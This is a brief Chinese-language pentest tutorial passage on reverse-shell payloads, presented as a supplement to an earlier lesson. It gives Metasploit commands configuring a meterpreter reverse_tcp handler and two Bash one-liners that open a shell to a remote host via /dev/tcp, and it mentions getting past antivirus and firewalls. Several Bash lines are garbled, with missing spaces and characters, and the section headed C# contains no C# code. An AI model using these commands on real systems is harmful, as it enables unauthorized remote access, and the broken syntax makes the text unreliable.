在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。


这次主要补充了C#，Bashps


在线代码高亮：http://tool.oschina.net/highlight


1.C#-payload


msf > use exploit/multi/handler

msf exploit(handler) > set payload windows/meterpreter/reverse_tcp

payload => windows/meterpreter/reverse_tcp

msf exploit(handler) > set LHOST 192.168.1.107

LHOST => 192.168.1.107




1.Bash-payload

i >& /dev/tcp/xx.xx.xx.xx/xx0>&1



exec 5<>/dev/tcp/xx.xx.xx.xx/xx

cat <&5| whileread line; do$line 2>&5>&5; done
